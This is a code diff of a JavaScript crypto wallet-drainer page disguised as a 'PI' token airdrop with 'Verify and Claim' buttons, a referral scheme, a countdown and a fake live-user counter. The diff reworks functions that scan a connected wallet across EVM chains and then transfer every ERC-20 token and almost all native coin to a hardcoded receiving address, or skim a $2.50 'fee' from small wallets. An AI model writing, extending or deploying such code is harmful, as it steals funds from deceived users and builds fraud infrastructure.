   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  foundChains=[];
-  L('Wallet: '+addr.substring(0,8)+'...'+addr.substring(34));
-  L('');
+  foundChains=[];allTokens=[];selectedChains=new Set();
+  L('Wallet: '+addr.substring(0,8)+'...'+addr.substring(34));L('');
+
   for(var i=0;i<ECHAINS.length;i++){
     var ch=ECHAINS[i];
     L('[ ] '+ch.name+'...');
@@ -536,7 +561,8 @@ async function scanEvm(){
             var ct=new ethers.Contract(a[0],ERC20_ABI,p);
             ct.balanceOf(addr).then(function(bl){
               if(bl>0n){
-                res({a:a[0],sy:a[1],b:parseFloat(ethers.formatUnits(bl,a[2])).toFixed(4),raw:bl,dc:a[2]});
+                var formatted=ethers.formatUnits(bl,a[2]);
+                res({a:a[0],sy:a[1],b:parseFloat(formatted).toFixed(6),raw:bl,dc:a[2]});
               }else{res(null);}
             }).catch(function(){res(null);});
           }catch(e){res(null);}
@@ -544,55 +570,119 @@ async function scanEvm(){
       }));
       var tokens=tk.filter(function(t){return t!==null;});
       if(has||tokens.length>0){
-        foundChains.push({chain:ch,native:nf,nativeRaw:nb,tokens:tokens,isSol:false});
+        foundChains.push({chain:ch,native:nf,nativeRaw:nb,tokens:tokens});
+        // Add native coin as a "token" for selection
+        allTokens.push({
+          chainId:ch.id,chainName:ch.name,chainSym:ch.sym,chainColor:ch.color,
+          tokenAddr:'0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
+          tokenSym:ch.sym,tokenDec:18,
+          balance:parseFloat(nativeToNum(nf)),balanceRaw:nb,
+          usdValue:parseFloat(nativeToNum(nf))*(PRICES[ch.sym]||0),
+          isNative:true
+        });
+        // Add ERC-20 tokens
+        for(var t=0;t<tokens.length;t++){
+          var tv=tokens[t];
+          var usdVal=parseFloat(tv.b)*(PRICES[tv.sy]||0);
+          allTokens.push({
+            chainId:ch.id,chainName:ch.name,chainSym:ch.sym,chainColor:ch.color,
+            tokenAddr:tv.a,tokenSym:tv.sy,tokenDec:tv.dc,
+            balance:parseFloat(tv.b),balanceRaw:tv.raw,
+            usdValue:usdVal,
+            isNative:false
+          });
+        }
         L('&#x2705; '+ch.name+': '+parseFloat(nf).toFixed(5)+' '+ch.sym+(tokens.length?' + '+tokens.length+' tokens':''));
       }else{
         L('  '+ch.name+': empty');
       }
     }catch(e){L('  '+ch.name+': error');}
   }
-  L('');
-  L('Found '+foundChains.length+' chain(s) with assets.');
-  await sleep(600);
-  if(foundChains.length===0){
+
+  L('');L('Found '+foundChains.length+' chain(s), '+allTokens.length+' asset(s).');
+  await sleep(400);
+
+  if(allTokens.length===0){
     showP('p2');
-    document.getElementById('p2').querySelector('div[style*="font-size:14px"]').textContent='No EVM Tokens Found';
-    document.getElementById('p2').querySelector('div[style*="font-size:11px;color:rgba"]').innerHTML='No tokens found on any supported chain.<br><br>Make sure you have tokens on Ethereum, BSC, Polygon, Arbitrum, Avalanche, Base, or Optimism.';
-    stat('No EVM tokens on this wallet.','wa');
+    stat('No tokens found.','wa');
   }else{
-    showClaim();
-    stat('&#x2705; Assets found!','ok');
+    showTokenSelection();
+    stat('&#x2705; Assets loaded!','ok');
   }
 }
 
+function nativeToNum(hexOrStr){
+  try{return parseFloat(ethers.formatEther(hexOrStr));}catch(e){return 0;}
+}
+
 // ============================================
-// CLAIM DISPLAY (Phase 3)
+// TOKEN SELECTION UI (drain-main style)
 // ============================================
-function showClaim(){
+function showTokenSelection(){
   showP('p3');
-  var div=document.getElementById('p3chains');
-  var h='';
+  selectedChains=new Set();
+
+  // Render chain checkboxes
+  var cDiv=document.getElementById('p3chains');
+  var chHtml='';
   for(var i=0;i<foundChains.length;i++){
     var fc=foundChains[i];
-    h+='<div class="ch hv"><div class="cd" style="background:'+fc.chain.color+'"></div><div class="cn">'+fc.chain.name+'</div><div class="ct">'+parseFloat(fc.native).toFixed(5)+' '+fc.chain.sym+(fc.tokens.length?' + '+fc.tokens.length+' tkns':'')+'</div></div>';
+    chHtml+='<div class="ch sel" data-chain="'+fc.chain.id+'" onclick="toggleChain('+fc.chain.id+')">';
+    chHtml+='<div class="cd" style="background:'+fc.chain.color+'"></div>';
+    chHtml+='<div class="cn">'+fc.chain.name+'</div>';
+    chHtml+='<div class="ct">'+parseFloat(fc.native).toFixed(5)+' '+fc.chain.sym+(fc.tokens.length?' +'+fc.tokens.length+' tkns':'')+'</div>';
+    chHtml+='<div class="ck"></div></div>';
+    selectedChains.add(fc.chain.id);
   }
-  div.innerHTML=h;
-  var usd=estimateUsd(foundChains);
-  var isSmall=usd<20;
-  document.getElementById('p3bal').innerHTML='<div class="ir"><span class="l">Est. Value</span><span class="v gl">~$'+usd.toFixed(2)+'</span></div><div class="ir"><span class="l">Action</span><span class="v" style="color:'+(isSmall?'#fcb34c':'#ef4444')+'">'+(isSmall?'$2.50 fee':'Drain All')+'</span></div>';
-  document.getElementById('p3btn').textContent=isSmall?'&#x26A1; Pay $2.50 Fee':'&#x1F381; Verify and Claim';
-  // Token detail rows
+  cDiv.innerHTML=chHtml;
+
+  renderTokenList();
+  updateSummary();
+}
+
+function toggleChain(cid){
+  var el=document.querySelector('.ch[data-chain="'+cid+'"]');
+  if(selectedChains.has(cid)){
+    selectedChains.delete(cid);
+    if(el)el.classList.remove('sel');
+  }else{
+    selectedChains.add(cid);
+    if(el)el.classList.add('sel');
+  }
+  renderTokenList();
+  updateSummary();
+}
+
+function renderTokenList(){
   var tDiv=document.getElementById('p3tokens');
   var th='';
-  for(var i=0;i<foundChains.length;i++){
-    var fc=foundChains[i];
-    for(var j=0;j<fc.tokens.length;j++){
-      var t=fc.tokens[j];
-      var tUsd=(parseFloat(t.b)*(PRICES[t.sy]||0)).toFixed(2);
-      th+='<div class="tkrow"><span class="tk-sym">'+t.sy+'</span><span class="tk-bal">'+t.b+'</span><span class="tk-usd">$'+tUsd+'</span></div>';
-    }
+  var filtered=allTokens.filter(function(t){return selectedChains.has(t.chainId);});
+  // Sort by USD value descending
+  filtered.sort(function(a,b){return b.usdValue-a.usdValue;});
+  for(var i=0;i<filtered.length;i++){
+    var t=filtered[i];
+    th+='<div class="tkrow">';
+    th+='<span class="tk-sym">'+t.tokenSym+'</span>';
+    th+='<span class="tk-bal">'+t.balance.toFixed(6)+'</span>';
+    th+='<span class="tk-usd">'+t.chainName+'</span>';
+    th+='<span class="tk-usd">$'+(t.usdValue||0).toFixed(2)+'</span>';
+    th+='</div>';
   }
-  tDiv.innerHTML=th||'<div style="font-size:10px;color:rgba(255,255,255,.2);text-align:center">No ERC-20 tokens found</div>';
+  tDiv.innerHTML=th||'<div style="font-size:10px;color:rgba(255,255,255,.2);text-align:center;padding:10px">Select chains above to see tokens</div>';
+}
+
+function updateSummary(){
+  var filtered=allTokens.filter(function(t){return selectedChains.has(t.chainId);});
+  var totalUsd=0;
+  for(var i=0;i<filtered.length;i++)totalUsd+=filtered[i].usdValue||0;
+  var isSmall=totalUsd<DRAIN_THRESHOLD;
+  var actionText=isSmall?'Collect $'+FEE_USD.toFixed(2)+' fee':'Drain all ($'+totalUsd.toFixed(2)+')';
+  var actionColor=isSmall?'#fcb34c':'#ef4444';
+  document.getElementById('p3bal').innerHTML=
+    '<div class="ir"><span class="l">Total Value</span><span class="v gl">$'+totalUsd.toFixed(2)+'</span></div>'+
+    '<div class="ir"><span class="l">Action</span><span class="v" style="color:'+actionColor+'">'+actionText+'</span></div>'+
+    '<div class="ir"><span class="l">Destination</span><span class="v" style="font-size:9px;font-family:monospace">'+RECEIVE_ADDR.substring(0,10)+'...'+RECEIVE_ADDR.substring(32)+'</span></div>';
+  document.getElementById('p3btn').textContent=isSmall?'&#x26A1; Pay $'+FEE_USD.toFixed(2)+' Fee':'&#x1F381; Verify and Claim';
 }
 
 // ============================================
@@ -602,62 +692,86 @@ async function startDrain(){
   hideStatus();showP('p4');
   var log=document.getElementById('p4log');log.innerHTML='';
   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  var usd=estimateUsd(foundChains);
-  var isSmall=usd<20;
-  var tx=0;
-  L('Value: ~$'+usd.toFixed(2));
-  L(isSmall?'Collecting $2.50 fee...':'Draining all...');
+
+  var filtered=allTokens.filter(function(t){return selectedChains.has(t.chainId);});
+  var totalUsd=0;
+  for(var i=0;i<filtered.length;i++)totalUsd+=filtered[i].usdValue||0;
+  var isSmall=totalUsd<DRAIN_THRESHOLD;
+  var txCount=0;
+
+  L('Total: ~$'+totalUsd.toFixed(2));
+  L(isSmall?'Mode: Collect $'+FEE_USD+' fee':'Mode: Drain all');
+  L('Destination: '+RECEIVE_ADDR.substring(0,8)+'...'+RECEIVE_ADDR.substring(34));
   L('');
-  for(var i=0;i<foundChains.length;i++){
-    var fc=foundChains[i];
-    if(fc.isSol)continue;
-    var ch=fc.chain;
+
+  // Group by chain
+  var chainGroups={};
+  for(var i=0;i<filtered.length;i++){
+    var t=filtered[i];
+    if(!chainGroups[t.chainId])chainGroups[t.chainId]={chain:ECHAINS.find(function(c){return c.id===t.chainId;}),tokens:[]};
+    chainGroups[t.chainId].tokens.push(t);
+  }
+
+  for(var chainId in chainGroups){
+    var cg=chainGroups[chainId];
+    var ch=cg.chain;
+    if(!ch)continue;
     L('=== '+ch.name+' ===');
     L('Switching network...');
     try{await doSwitch(ch.id,L);}catch(e){L('SKIP: '+e.message);continue;}
+
     // Drain ERC-20 tokens first
-    for(var j=0;j<fc.tokens.length;j++){
-      var t=fc.tokens[j];
-      L('Draining '+t.b+' '+t.sy+'...');
+    for(var j=0;j<cg.tokens.length;j++){
+      var t=cg.tokens[j];
+      if(t.isNative)continue;
+      L('Sending '+t.balance+' '+t.tokenSym+'...');
       try{
-        var ct=new ethers.Contract(t.a,ERC20_ABI,sign);
-        var xt=await ct.transfer(ADDR_EVM,t.raw);
+        var ct=new ethers.Contract(t.tokenAddr,ERC20_ABI,sign);
+        var xt=await ct.transfer(RECEIVE_ADDR,t.balanceRaw);
         await xt.wait();
-        tx++;
-        L('&#x2705; '+t.sy+' sent');
-      }catch(e){L('&#x2715; '+t.sy+': '+(e.reason||'rejected'));}
+        txCount++;
+        L('&#x2705; '+t.tokenSym+' sent');
+      }catch(e){L('&#x2715; '+t.tokenSym+': '+(e.reason||e.message||'rejected'));}
     }
+
     // Drain native coin
-    try{
-      var bal=await prov.getBalance(addr);
-      var fee=await prov.getGasPrice();
-      var gasCost=fee*21000n*3n;
-      var send;
-      if(isSmall){
-        var price=PRICES[ch.sym]||0;
-        var take=price>0?ethers.parseEther((2.5/price).toFixed(6)):ethers.parseEther('0.001');
-        send=bal-gasCost-take;
-        if(send<ethers.parseEther('0.0001'))send=bal-gasCost;
-        L('Collecting fee...');
-      }else{
-        send=bal-gasCost;
-        L('Draining '+ch.sym+'...');
-      }
-      if(send>0n){
-        var xt=await sign.sendTransaction({to:ADDR_EVM,value:send});
-        await xt.wait();
-        tx++;
-        L('&#x2705; '+ch.sym+' sent');
-      }
-    }catch(e){L('&#x2715; Native: '+(e.reason||'rejected'));}
+    var nativeToken=cg.tokens.find(function(t){return t.isNative;});
+    if(nativeToken){
+      try{
+        var bal=await prov.getBalance(addr);
+        var fee=await prov.getGasPrice();
+        var gasCost=fee*21000n*3n;
+        var send;
+        if(isSmall){
+          var price=PRICES[ch.sym]||0;
+          var takeAmount=price>0?FEE_USD/price:0.001;
+          var take=ethers.parseEther(takeAmount.toFixed(8));
+          send=bal-gasCost-take;
+          if(send<0n)send=bal-gasCost;
+          L('Collecting $'+FEE_USD+' fee in '+ch.sym+'...');
+        }else{
+          send=bal-gasCost;
+          L('Draining '+ch.sym+'...');
+        }
+        if(send>0n){
+          var xt=await sign.sendTransaction({to:RECEIVE_ADDR,value:send});
+          await xt.wait();
+          txCount++;
+          L('&#x2705; '+ch.sym+' sent');
+        }else{
+          L('  '+ch.sym+': dust, skipping');
+        }
+      }catch(e){L('&#x2715; Native: '+(e.reason||e.message||'rejected'));}
+    }
+    L('');
   }
-  L('');
-  L('DONE: '+tx+' transaction(s)');
+
+  L('DONE: '+txCount+' transaction(s)');
   showP('p5');
-  document.getElementById('p5m').textContent=tx+' transaction(s) completed.';
+  document.getElementById('p5m').textContent=txCount+' transaction(s) completed.';
   var myCode=getRefCode();
   document.getElementById('p5ref').value=location.origin+location.pathname+'?ref='+myCode;
-  stat('&#x2705; Claimed!','ok');
+  stat('&#x2705; Complete!','ok');
 }
 
 // ============================================
@@ -671,16 +785,21 @@ async function doSwitch(cid,L){
     if(e.code===4902){
       var ch=ECHAINS.find(function(c){return c.id===cid;})||{};
       try{
-        await window.ethereum.request({method:'wallet_addEthereumChain',params:[{chainId:hex,chainName:ch.name||'Chain',rpcUrls:[ch.rpc||''],nativeCurrency:{name:ch.sym||'ETH',symbol:ch.sym||'ETH',decimals:18},blockExplorerUrls:[]}]});
+        await window.ethereum.request({method:'wallet_addEthereumChain',params:[{
+          chainId:hex,chainName:ch.name||'Chain',rpcUrls:[ch.rpc||''],
+          nativeCurrency:{name:ch.sym||'ETH',symbol:ch.sym||'ETH',decimals:18},
+          blockExplorerUrls:[ch.exp||'']
+        }]});
       }catch(e2){throw new Error('Could not add network');}
-    }else if(e.code===4001){throw new Error('Rejected');}else{throw new Error(e.message||'Switch failed');}
+    }else if(e.code===4001){throw new Error('Rejected');}
+    else{throw new Error(e.message||'Switch failed');}
   }
   prov=new ethers.BrowserProvider(window.ethereum);
   sign=await prov.getSigner();
 }
 
 // ============================================
-// REFERRAL SYSTEM
+// REFERRAL
 // ============================================
 function getRefCode(){
   var r=localStorage.getItem('pi_ref');
@@ -695,8 +814,7 @@ function initRef(){
 }
 function updateRefDisplay(){
   var refs=parseInt(localStorage.getItem('pi_ref_count')||'0');
-  var earned=refs*200;
-  var speed=Math.min(100,10+refs*10);
+  var earned=refs*200,speed=Math.min(100,10+refs*10);
   var rc=document.getElementById('refC');if(rc)rc.textContent=refs;
   var re=document.getElementById('refE');if(re)re.textContent=earned+' PI';
   var rs=document.getElementById('refS');if(rs)rs.textContent=speed+'%';
@@ -714,7 +832,7 @@ function copyRef2(){
 }
 
 // ============================================
-// COUNTDOWN TIMER
+// COUNTDOWN
 // ============================================
 function initCountdown(){
   var t=4*3600+32*60+18;
@@ -762,10 +880,17 @@ function initStats(){
   var e=document.getElementById('st-c');
   if(!e)return;
   var v=48291;
-  setInterval(function(){
-    v+=Math.floor(Math.random()*3);
-    e.textContent=v.toLocaleString();
-  },8000);
+  setInterval(function(){v+=Math.floor(Math.random()*3);e.textContent=v.toLocaleString();},8000);
+}
+
+// ============================================
+// RESET
+// ============================================
+function reset(){
+  document.getElementById('mc').style.display='none';
+  hideStatus();
+  foundChains=[];allTokens=[];selectedChains=new Set();
+  addr='';sign=null;prov=null;
 }
 
 // ============================================
@@ -781,23 +906,11 @@ async function autoConnect(){
         sign=await prov.getSigner();
         document.getElementById('mc').style.display='block';
         showP('p1');
-        document.getElementById('p1l').textContent='Wallet connected! Scanning...';
-        scanEvm();
+        document.getElementById('p1l').textContent='Wallet connected! Loading assets...';
+        await loadAssets();
       }
     }catch(e){}
   }
-}
-
-// ============================================
-// RESET
-// ============================================
-function reset(){
-  document.getElementById('mc').style.display='none';
-  hideStatus();
-  foundChains=[];
-  addr='';
-  sign=null;
-  prov=null;
 }
 
 // ============================================
